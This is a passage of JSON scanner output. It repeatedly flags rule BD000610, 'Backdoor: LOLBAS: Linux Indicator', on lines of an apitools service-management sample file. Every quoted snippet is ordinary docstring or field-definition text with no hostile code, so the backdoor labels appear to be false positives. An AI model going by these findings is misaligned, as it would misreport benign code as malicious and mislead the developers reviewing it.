                      "markdown": "`  class ConsumerEnableStatusValueValuesEnum(_messages.Enum):\n    r\"\"\"Consumer controlled setting to enable/disable use of this service by\n    the consumer project. The default value of this is controlled by the\n    service configuration.\n\n    Values:\n      DISABLED: The service is disabled.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3376,
                  "startColumn": 65,
                  "endLine": 3376,
                  "endColumn": 74,
                  "snippet": {
                    "text": "  \"\"\"\n\n  class ConsumerEnableStatusValueValuesEnum(_messages.Enum):\n    r\"\"\"Consumer controlled setting to enable/disable use of this service by\n    the consumer project. The default value of this is controlled by the\n    service configuration.\n\n",
                    "rendered": {
                      "text": "  \"\"\"\n\n  class ConsumerEnableStatusValueValuesEnum(_messages.Enum):\n    r\"\"\"Consumer controlled setting to enable/disable use of this service by\n    the consumer project. The default value of this is controlled by the\n    service configuration.\n\n",
                      "markdown": "`  \"\"\"\n\n  class ConsumerEnableStatusValueValuesEnum(_messages.Enum):\n    r\"\"\"Consumer controlled setting to enable/disable use of this service by\n    the consumer project. The default value of this is controlled by the\n    service configuration.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3372,
                  "startColumn": 23,
                  "endLine": 3372,
                  "endColumn": 32,
                  "snippet": {
                    "text": "  Fields:\n    consumerEnableStatus: Consumer controlled setting to enable/disable use of\n      this service by the consumer project. The default value of this is\n      controlled by the service configuration.\n  \"\"\"\n\n  class ConsumerEnableStatusValueValuesEnum(_messages.Enum):\n",
                    "rendered": {
                      "text": "  Fields:\n    consumerEnableStatus: Consumer controlled setting to enable/disable use of\n      this service by the consumer project. The default value of this is\n      controlled by the service configuration.\n  \"\"\"\n\n  class ConsumerEnableStatusValueValuesEnum(_messages.Enum):\n",
                      "markdown": "`  Fields:\n    consumerEnableStatus: Consumer controlled setting to enable/disable use of\n      this service by the consumer project. The default value of this is\n      controlled by the service configuration.\n  \"\"\"\n\n  class ConsumerEnableStatusValueValuesEnum(_messages.Enum):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3371,
                  "startColumn": 10,
                  "endLine": 3371,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\n  Fields:\n    consumerEnableStatus: Consumer controlled setting to enable/disable use of\n      this service by the consumer project. The default value of this is\n      controlled by the service configuration.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "\n  Fields:\n    consumerEnableStatus: Consumer controlled setting to enable/disable use of\n      this service by the consumer project. The default value of this is\n      controlled by the service configuration.\n  \"\"\"\n\n",
                      "markdown": "`\n  Fields:\n    consumerEnableStatus: Consumer controlled setting to enable/disable use of\n      this service by the consumer project. The default value of this is\n      controlled by the service configuration.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3367,
                  "startColumn": 40,
                  "endLine": 3367,
                  "endColumn": 49,
                  "snippet": {
                    "text": "  Enums:\n    ConsumerEnableStatusValueValuesEnum: Consumer controlled setting to\n      enable/disable use of this service by the consumer project. The default\n      value of this is controlled by the service configuration.\n\n  Fields:\n    consumerEnableStatus: Consumer controlled setting to enable/disable use of\n",
                    "rendered": {
                      "text": "  Enums:\n    ConsumerEnableStatusValueValuesEnum: Consumer controlled setting to\n      enable/disable use of this service by the consumer project. The default\n      value of this is controlled by the service configuration.\n\n  Fields:\n    consumerEnableStatus: Consumer controlled setting to enable/disable use of\n",
                      "markdown": "`  Enums:\n    ConsumerEnableStatusValueValuesEnum: Consumer controlled setting to\n      enable/disable use of this service by the consumer project. The default\n      value of this is controlled by the service configuration.\n\n  Fields:\n    consumerEnableStatus: Consumer controlled setting to enable/disable use of\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3366,
                  "startColumn": 32,
                  "endLine": 3366,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\n  Enums:\n    ConsumerEnableStatusValueValuesEnum: Consumer controlled setting to\n      enable/disable use of this service by the consumer project. The default\n      value of this is controlled by the service configuration.\n\n  Fields:\n",
                    "rendered": {
                      "text": "\n  Enums:\n    ConsumerEnableStatusValueValuesEnum: Consumer controlled setting to\n      enable/disable use of this service by the consumer project. The default\n      value of this is controlled by the service configuration.\n\n  Fields:\n",
                      "markdown": "`\n  Enums:\n    ConsumerEnableStatusValueValuesEnum: Consumer controlled setting to\n      enable/disable use of this service by the consumer project. The default\n      value of this is controlled by the service configuration.\n\n  Fields:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3319,
                  "startColumn": 21,
                  "endLine": 3319,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        that owns the service.  Access is further constrained to the group\n        controlled by the administrator of the project/org that owns the\n        service.\n      ORG_PUBLIC: The service can be seen/used by the group of users\n        controlled by the administrator of the project/org that owns the\n        service.\n    \"\"\"\n",
                    "rendered": {
                      "text": "        that owns the service.  Access is further constrained to the group\n        controlled by the administrator of the project/org that owns the\n        service.\n      ORG_PUBLIC: The service can be seen/used by the group of users\n        controlled by the administrator of the project/org that owns the\n        service.\n    \"\"\"\n",
                      "markdown": "`        that owns the service.  Access is further constrained to the group\n        controlled by the administrator of the project/org that owns the\n        service.\n      ORG_PUBLIC: The service can be seen/used by the group of users\n        controlled by the administrator of the project/org that owns the\n        service.\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3314,
                  "startColumn": 25,
                  "endLine": 3314,
                  "endColumn": 34,
                  "snippet": {
                    "text": "        publishing, then this mode will be treated like ORG_PUBLIC.  The\n        discovery document for the service will also be public and allow\n        unregistered access.\n      ORG_RESTRICTED: The service can be seen/used by users identified in the\n        service's access control policy and they are within the organization\n        that owns the service.  Access is further constrained to the group\n        controlled by the administrator of the project/org that owns the\n",
                    "rendered": {
                      "text": "        publishing, then this mode will be treated like ORG_PUBLIC.  The\n        discovery document for the service will also be public and allow\n        unregistered access.\n      ORG_RESTRICTED: The service can be seen/used by users identified in the\n        service's access control policy and they are within the organization\n        that owns the service.  Access is further constrained to the group\n        controlled by the administrator of the project/org that owns the\n",
                      "markdown": "`        publishing, then this mode will be treated like ORG_PUBLIC.  The\n        discovery document for the service will also be public and allow\n        unregistered access.\n      ORG_RESTRICTED: The service can be seen/used by users identified in the\n        service's access control policy and they are within the organization\n        that owns the service.  Access is further constrained to the group\n        controlled by the administrator of the project/org that owns the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3312,
                  "startColumn": 34,
                  "endLine": 3312,
                  "endColumn": 43,
                  "snippet": {
                    "text": "      PUBLIC: The service can be seen/used by anyone.  If the service has not\n        been whitelisted by your domain administrator for out-of-org\n        publishing, then this mode will be treated like ORG_PUBLIC.  The\n        discovery document for the service will also be public and allow\n        unregistered access.\n      ORG_RESTRICTED: The service can be seen/used by users identified in the\n        service's access control policy and they are within the organization\n",
                    "rendered": {
                      "text": "      PUBLIC: The service can be seen/used by anyone.  If the service has not\n        been whitelisted by your domain administrator for out-of-org\n        publishing, then this mode will be treated like ORG_PUBLIC.  The\n        discovery document for the service will also be public and allow\n        unregistered access.\n      ORG_RESTRICTED: The service can be seen/used by users identified in the\n        service's access control policy and they are within the organization\n",
                      "markdown": "`      PUBLIC: The service can be seen/used by anyone.  If the service has not\n        been whitelisted by your domain administrator for out-of-org\n        publishing, then this mode will be treated like ORG_PUBLIC.  The\n        discovery document for the service will also be public and allow\n        unregistered access.\n      ORG_RESTRICTED: The service can be seen/used by users identified in the\n        service's access control policy and they are within the organization\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3309,
                  "startColumn": 61,
                  "endLine": 3309,
                  "endColumn": 70,
                  "snippet": {
                    "text": "        service's access control policy.  If the service has not been\n        whitelisted by your domain administrator for out-of-org publishing,\n        then this mode will be treated like ORG_RESTRICTED.\n      PUBLIC: The service can be seen/used by anyone.  If the service has not\n        been whitelisted by your domain administrator for out-of-org\n        publishing, then this mode will be treated like ORG_PUBLIC.  The\n        discovery document for the service will also be public and allow\n",
                    "rendered": {
                      "text": "        service's access control policy.  If the service has not been\n        whitelisted by your domain administrator for out-of-org publishing,\n        then this mode will be treated like ORG_RESTRICTED.\n      PUBLIC: The service can be seen/used by anyone.  If the service has not\n        been whitelisted by your domain administrator for out-of-org\n        publishing, then this mode will be treated like ORG_PUBLIC.  The\n        discovery document for the service will also be public and allow\n",
                      "markdown": "`        service's access control policy.  If the service has not been\n        whitelisted by your domain administrator for out-of-org publishing,\n        then this mode will be treated like ORG_RESTRICTED.\n      PUBLIC: The service can be seen/used by anyone.  If the service has not\n        been whitelisted by your domain administrator for out-of-org\n        publishing, then this mode will be treated like ORG_PUBLIC.  The\n        discovery document for the service will also be public and allow\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3309,
                  "startColumn": 17,
                  "endLine": 3309,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        service's access control policy.  If the service has not been\n        whitelisted by your domain administrator for out-of-org publishing,\n        then this mode will be treated like ORG_RESTRICTED.\n      PUBLIC: The service can be seen/used by anyone.  If the service has not\n        been whitelisted by your domain administrator for out-of-org\n        publishing, then this mode will be treated like ORG_PUBLIC.  The\n        discovery document for the service will also be public and allow\n",
                    "rendered": {
                      "text": "        service's access control policy.  If the service has not been\n        whitelisted by your domain administrator for out-of-org publishing,\n        then this mode will be treated like ORG_RESTRICTED.\n      PUBLIC: The service can be seen/used by anyone.  If the service has not\n        been whitelisted by your domain administrator for out-of-org\n        publishing, then this mode will be treated like ORG_PUBLIC.  The\n        discovery document for the service will also be public and allow\n",
                      "markdown": "`        service's access control policy.  If the service has not been\n        whitelisted by your domain administrator for out-of-org publishing,\n        then this mode will be treated like ORG_RESTRICTED.\n      PUBLIC: The service can be seen/used by anyone.  If the service has not\n        been whitelisted by your domain administrator for out-of-org\n        publishing, then this mode will be treated like ORG_PUBLIC.  The\n        discovery document for the service will also be public and allow\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3306,
                  "startColumn": 48,
                  "endLine": 3306,
                  "endColumn": 57,
                  "snippet": {
                    "text": "\n    Values:\n      RESTRICTED: The service can only be seen/used by users identified in the\n        service's access control policy.  If the service has not been\n        whitelisted by your domain administrator for out-of-org publishing,\n        then this mode will be treated like ORG_RESTRICTED.\n      PUBLIC: The service can be seen/used by anyone.  If the service has not\n",
                    "rendered": {
                      "text": "\n    Values:\n      RESTRICTED: The service can only be seen/used by users identified in the\n        service's access control policy.  If the service has not been\n        whitelisted by your domain administrator for out-of-org publishing,\n        then this mode will be treated like ORG_RESTRICTED.\n      PUBLIC: The service can be seen/used by anyone.  If the service has not\n",
                      "markdown": "`\n    Values:\n      RESTRICTED: The service can only be seen/used by users identified in the\n        service's access control policy.  If the service has not been\n        whitelisted by your domain administrator for out-of-org publishing,\n        then this mode will be treated like ORG_RESTRICTED.\n      PUBLIC: The service can be seen/used by anyone.  If the service has not\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3305,
                  "startColumn": 21,
                  "endLine": 3305,
                  "endColumn": 30,
                  "snippet": {
                    "text": "    r\"\"\"Controls which users can see or activate the service.\n\n    Values:\n      RESTRICTED: The service can only be seen/used by users identified in the\n        service's access control policy.  If the service has not been\n        whitelisted by your domain administrator for out-of-org publishing,\n        then this mode will be treated like ORG_RESTRICTED.\n",
                    "rendered": {
                      "text": "    r\"\"\"Controls which users can see or activate the service.\n\n    Values:\n      RESTRICTED: The service can only be seen/used by users identified in the\n        service's access control policy.  If the service has not been\n        whitelisted by your domain administrator for out-of-org publishing,\n        then this mode will be treated like ORG_RESTRICTED.\n",
                      "markdown": "`    r\"\"\"Controls which users can see or activate the service.\n\n    Values:\n      RESTRICTED: The service can only be seen/used by users identified in the\n        service's access control policy.  If the service has not been\n        whitelisted by your domain administrator for out-of-org publishing,\n        then this mode will be treated like ORG_RESTRICTED.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3291,
                  "startColumn": 34,
                  "endLine": 3291,
                  "endColumn": 43,
                  "snippet": {
                    "text": "    dependsOnServices: Services that must be activated in order for this\n      service to be used. The set of services activated as a result of these\n      relations are all activated in parallel with no guaranteed order of\n      activation. Each string is a service name, e.g.\n      `calendar.googleapis.com`.\n    requirements: Requirements that must be satisfied before a consumer\n      project can use the service. Each requirement is of the form\n",
                    "rendered": {
                      "text": "    dependsOnServices: Services that must be activated in order for this\n      service to be used. The set of services activated as a result of these\n      relations are all activated in parallel with no guaranteed order of\n      activation. Each string is a service name, e.g.\n      `calendar.googleapis.com`.\n    requirements: Requirements that must be satisfied before a consumer\n      project can use the service. Each requirement is of the form\n",
                      "markdown": "`    dependsOnServices: Services that must be activated in order for this\n      service to be used. The set of services activated as a result of these\n      relations are all activated in parallel with no guaranteed order of\n      activation. Each string is a service name, e.g.\n      `calendar.googleapis.com`.\n    requirements: Requirements that must be satisfied before a consumer\n      project can use the service. Each requirement is of the form\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3289,
                  "startColumn": 5,
                  "endLine": 3289,
                  "endColumn": 14,
                  "snippet": {
                    "text": "      hook is of the form <service.name>/<hook-id>, where <hook-id> is\n      optional; for example: 'compute.googleapis.com/'.\n    dependsOnServices: Services that must be activated in order for this\n      service to be used. The set of services activated as a result of these\n      relations are all activated in parallel with no guaranteed order of\n      activation. Each string is a service name, e.g.\n      `calendar.googleapis.com`.\n",
                    "rendered": {
                      "text": "      hook is of the form <service.name>/<hook-id>, where <hook-id> is\n      optional; for example: 'compute.googleapis.com/'.\n    dependsOnServices: Services that must be activated in order for this\n      service to be used. The set of services activated as a result of these\n      relations are all activated in parallel with no guaranteed order of\n      activation. Each string is a service name, e.g.\n      `calendar.googleapis.com`.\n",
                      "markdown": "`      hook is of the form <service.name>/<hook-id>, where <hook-id> is\n      optional; for example: 'compute.googleapis.com/'.\n    dependsOnServices: Services that must be activated in order for this\n      service to be used. The set of services activated as a result of these\n      relations are all activated in parallel with no guaranteed order of\n      activation. Each string is a service name, e.g.\n      `calendar.googleapis.com`.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3284,
                  "startColumn": 32,
                  "endLine": 3284,
                  "endColumn": 41,
                  "snippet": {
                    "text": "      hook is of the form <service.name>/<hook-id>, where <hook-id> is\n      optional; for example: 'robotservice.googleapis.com/default'.\n    deactivationHooks: Services that must be contacted before a consumer can\n      deactivate a service. Each service will be contacted in sequence, and,\n      if any deactivation call fails, the entire deactivation will fail. Each\n      hook is of the form <service.name>/<hook-id>, where <hook-id> is\n      optional; for example: 'compute.googleapis.com/'.\n",
                    "rendered": {
                      "text": "      hook is of the form <service.name>/<hook-id>, where <hook-id> is\n      optional; for example: 'robotservice.googleapis.com/default'.\n    deactivationHooks: Services that must be contacted before a consumer can\n      deactivate a service. Each service will be contacted in sequence, and,\n      if any deactivation call fails, the entire deactivation will fail. Each\n      hook is of the form <service.name>/<hook-id>, where <hook-id> is\n      optional; for example: 'compute.googleapis.com/'.\n",
                      "markdown": "`      hook is of the form <service.name>/<hook-id>, where <hook-id> is\n      optional; for example: 'robotservice.googleapis.com/default'.\n    deactivationHooks: Services that must be contacted before a consumer can\n      deactivate a service. Each service will be contacted in sequence, and,\n      if any deactivation call fails, the entire deactivation will fail. Each\n      hook is of the form <service.name>/<hook-id>, where <hook-id> is\n      optional; for example: 'compute.googleapis.com/'.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3279,
                  "startColumn": 35,
                  "endLine": 3279,
                  "endColumn": 44,
                  "snippet": {
                    "text": "\n  Fields:\n    activationHooks: Services that must be contacted before a consumer can\n      begin using the service. Each service will be contacted in sequence,\n      and, if any activation call fails, the entire activation will fail. Each\n      hook is of the form <service.name>/<hook-id>, where <hook-id> is\n      optional; for example: 'robotservice.googleapis.com/default'.\n",
                    "rendered": {
                      "text": "\n  Fields:\n    activationHooks: Services that must be contacted before a consumer can\n      begin using the service. Each service will be contacted in sequence,\n      and, if any activation call fails, the entire activation will fail. Each\n      hook is of the form <service.name>/<hook-id>, where <hook-id> is\n      optional; for example: 'robotservice.googleapis.com/default'.\n",
                      "markdown": "`\n  Fields:\n    activationHooks: Services that must be contacted before a consumer can\n      begin using the service. Each service will be contacted in sequence,\n      and, if any activation call fails, the entire activation will fail. Each\n      hook is of the form <service.name>/<hook-id>, where <hook-id> is\n      optional; for example: 'robotservice.googleapis.com/default'.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3223,
                  "startColumn": 25,
                  "endLine": 3223,
                  "endColumn": 34,
                  "snippet": {
                    "text": "  Fields:\n    rules: Define system parameters.  The parameters defined here will\n      override the default parameters implemented by the system. If this field\n      is missing from the service config, default system parameters will be\n      used. Default system parameters and names is implementation-dependent.\n      Example: define api key and alt name for all methods  system_parameters\n      rules:     - selector: \"*\"       parameters:         - name: api_key\n",
                    "rendered": {
                      "text": "  Fields:\n    rules: Define system parameters.  The parameters defined here will\n      override the default parameters implemented by the system. If this field\n      is missing from the service config, default system parameters will be\n      used. Default system parameters and names is implementation-dependent.\n      Example: define api key and alt name for all methods  system_parameters\n      rules:     - selector: \"*\"       parameters:         - name: api_key\n",
                      "markdown": "`  Fields:\n    rules: Define system parameters.  The parameters defined here will\n      override the default parameters implemented by the system. If this field\n      is missing from the service config, default system parameters will be\n      used. Default system parameters and names is implementation-dependent.\n      Example: define api key and alt name for all methods  system_parameters\n      rules:     - selector: \"*\"       parameters:         - name: api_key\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3066,
                  "startColumn": 6,
                  "endLine": 3066,
                  "endColumn": 15,
                  "snippet": {
                    "text": "  message can be used in a variety of environments, either with or without\n  APIs, to provide a consistent developer experience across different\n  environments.  Example uses of this error model include:  - Partial errors.\n  If a service needs to return partial errors to the client,     it may embed\n  the `Status` in the normal response to indicate the partial     errors.  -\n  Workflow errors. A typical workflow has multiple steps. Each step may\n  have a `Status` message for error reporting purpose.  - Batch operations. If\n",
                    "rendered": {
                      "text": "  message can be used in a variety of environments, either with or without\n  APIs, to provide a consistent developer experience across different\n  environments.  Example uses of this error model include:  - Partial errors.\n  If a service needs to return partial errors to the client,     it may embed\n  the `Status` in the normal response to indicate the partial     errors.  -\n  Workflow errors. A typical workflow has multiple steps. Each step may\n  have a `Status` message for error reporting purpose.  - Batch operations. If\n",
                      "markdown": "`  message can be used in a variety of environments, either with or without\n  APIs, to provide a consistent developer experience across different\n  environments.  Example uses of this error model include:  - Partial errors.\n  If a service needs to return partial errors to the client,     it may embed\n  the `Status` in the normal response to indicate the partial     errors.  -\n  Workflow errors. A typical workflow has multiple steps. Each step may\n  have a `Status` message for error reporting purpose.  - Batch operations. If\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2954,
                  "startColumn": 33,
                  "endLine": 2954,
                  "endColumn": 42,
                  "snippet": {
                    "text": "    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n    updateMask: A mask specifying which fields to update. Update mask has been\n      deprecated on UpdateService service method. Please use PatchService\n      method instead to do partial updates.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n    updateMask: A mask specifying which fields to update. Update mask has been\n      deprecated on UpdateService service method. Please use PatchService\n      method instead to do partial updates.\n  \"\"\"\n\n",
                      "markdown": "`    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n    updateMask: A mask specifying which fields to update. Update mask has been\n      deprecated on UpdateService service method. Please use PatchService\n      method instead to do partial updates.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2940,
                  "startColumn": 1,
                  "endLine": 2940,
                  "endColumn": 10,
                  "snippet": {
                    "text": "      PatchServiceConfig method instead to do partial updates.\n  \"\"\"\n\n  service = _messages.MessageField('Service', 1)\n  serviceName = _messages.StringField(2, required=True)\n  updateMask = _messages.StringField(3)\n\n",
                    "rendered": {
                      "text": "      PatchServiceConfig method instead to do partial updates.\n  \"\"\"\n\n  service = _messages.MessageField('Service', 1)\n  serviceName = _messages.StringField(2, required=True)\n  updateMask = _messages.StringField(3)\n\n",
